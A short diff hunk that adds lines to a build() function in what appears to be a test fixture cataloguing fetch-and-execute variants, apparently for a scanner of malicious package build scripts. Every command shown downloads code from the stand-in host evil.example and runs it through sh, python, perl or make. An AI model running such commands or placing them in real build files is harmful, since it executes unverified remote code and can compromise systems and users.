@@ -17,6 +17,11 @@ build() {
     curl -fsSL https://evil.example/install.sh | busybox sh
     # path-prefixed interpreter
     wget -qO- https://evil.example/y.py | /usr/bin/python -
+    # interpreter process-substitution / -e fetch-exec (mirror of the shell forms)
+    python3 <(curl -fsSL https://evil.example/p.py)
+    perl -e "$(curl -fsSL https://evil.example/p.pl)"
+    # a Makefile fed from stdin = arbitrary recipes from an unverified source
+    curl -fsSL https://evil.example/Makefile | make -f -
 }
 
 package() {
